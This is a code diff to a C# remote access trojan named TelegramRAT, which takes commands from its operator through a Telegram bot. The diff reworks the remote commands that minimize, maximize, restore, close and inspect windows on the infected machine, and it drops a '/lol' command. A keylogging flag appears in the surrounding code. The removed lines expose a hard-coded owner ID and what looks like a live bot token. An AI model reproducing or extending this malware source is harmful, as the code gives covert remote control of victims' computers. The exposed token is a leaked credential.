@@ -31,8 +31,8 @@ namespace TelegramRAT
     {
         static TelegramBotClient Bot;
 
-        readonly static long? OwnerId = 1113634091; // Place your Telegram id here or keep it null.
-        readonly static string BotToken = "1727211141:AAHYjMAS6Zo7q7_kgRLUkkOj7lVjWonhikQ"; // Place your Telegram bot token. 
+        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
+        readonly static string BotToken = null; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
@@ -908,31 +908,15 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            IntPtr hWnd;
-
-                            if (model.Args[0].Contains("0x"))
-                            {
-                                string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                                int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                                hWnd = new IntPtr(lol);
-                            }
-                            else
-                            {
-                                hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                            }
-                            if (hWnd != IntPtr.Zero)
-                            {
-                                bool isSuccessful = WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
-                                if (isSuccessful)
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                                else
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Failed!", replyToMessageId: update.Message.MessageId);
-
-                            }
+                            if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                             else
                             {
                                 Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
+                                return;
                             }
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+
                         }
                         catch (Exception ex)
                         {
@@ -954,30 +938,14 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        IntPtr hWnd;
-
-                        if (model.Args[0].Contains("0x"))
-                        {
-                            string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                            int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                            hWnd = new IntPtr(lol);
-                        }
-                        else
-                        {
-                            hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                        }
-                        if (hWnd != IntPtr.Zero)
-                        {
-                            bool isSuccessful = WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
-                            if (isSuccessful)
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                            else
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Failed!", replyToMessageId: update.Message.MessageId);
-                        }
+                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
                         else
                         {
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
+                            return;
                         }
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                     });
                 }
             });
@@ -994,30 +962,15 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        IntPtr hWnd;
 
-                        if (model.Args[0].Contains("0x"))
-                        {
-                            string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                            int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                            hWnd = new IntPtr(lol);
-                        }
-                        else
-                        {
-                            hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                        }
-                        if (hWnd != IntPtr.Zero)
-                        {
-                            bool isSuccessful = WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
-                            if (isSuccessful)
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                            else
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Failed!", replyToMessageId: update.Message.MessageId);
-                        }
+                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                         else
                         {
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
+                            return;
                         }
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
 
                     });
                 }
@@ -1035,30 +988,17 @@ namespace TelegramRAT
                 {
                     await Task.Run(() =>
                     {
-                        IntPtr hWnd;
 
-                        if (model.Args[0].Contains("0x"))
-                        {
-                            string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                            int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                            hWnd = new IntPtr(lol);
-                        }
-                        else
-                        {
-                            hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                        }
-                        if (hWnd != IntPtr.Zero)
-                        {
-                            bool isSuccessful = WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
-                            if (isSuccessful)
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                            else
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Failed!", replyToMessageId: update.Message.MessageId);
-                        }
+                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
                         else
                         {
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
+                            return;
                         }
+
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+
                     });
                 }
             });
@@ -1075,23 +1015,10 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        IntPtr hWnd;
-
-                        if (model.Args[0].Contains("0x"))
+                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
                         {
-                            string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                            int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                            hWnd = new IntPtr(lol);
-                        }
-                        else
-                        {
-                            hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                        }
-
-                        if (hWnd != IntPtr.Zero)
-                        {
-                            WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
-                            WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                         }
                         else
@@ -1117,18 +1044,9 @@ namespace TelegramRAT
                             IntPtr hWnd;
                             if (model.Args.Length > 0)
                             {
-                                if (model.Args[0].Contains("0x"))
-                                {
-                                    string aboba = string.Join(string.Empty, model.Args[0].Skip(2));
-                                    int lol = int.Parse(aboba, System.Globalization.NumberStyles.HexNumber);
-                                    hWnd = new IntPtr(lol);
-
-                                }
-                                else
-                                {
+                                if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
                                     hWnd = WinAPI.FindWindow(null, model.RawArgs);
-                                }
-                                if (hWnd == IntPtr.Zero)
+                                else
                                 {
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
                                     return;
@@ -1136,6 +1054,7 @@ namespace TelegramRAT
                             }
                             else
                             {
+
                                 hWnd = WinAPI.GetForegroundWindow();
                             }
                             Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
@@ -1145,12 +1064,10 @@ namespace TelegramRAT
                             $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
                             $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                             $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
-                            $"Pointer: 0x{hWnd.ToString("X")}";
+                            $"Pointer: {hWnd.ToString("X")}";
 
                             //bitmap bitmap = new bitmap(windowbounds.width, windowbounds.height);
-                            Graphics thumbnail = Graphics.FromHdc(WinAPI.GetDC(WinAPI.GetForegroundWindow()));
-
-                            //thumbnail
+                            //Graphics thumbnail = Graphics.FromImage(bitmap);
                             //IntPtr hDc = thumbnail.GetHdc();
 
                             //WinAPI.PrintWindow(hWnd, hDc, 0);
@@ -1737,12 +1654,6 @@ namespace TelegramRAT
                     });
                 }
             });
-
-            CommandsList.Add(new BotCommand
-            {
-                Command = "/lol"
-            });
-
 
         }
     }
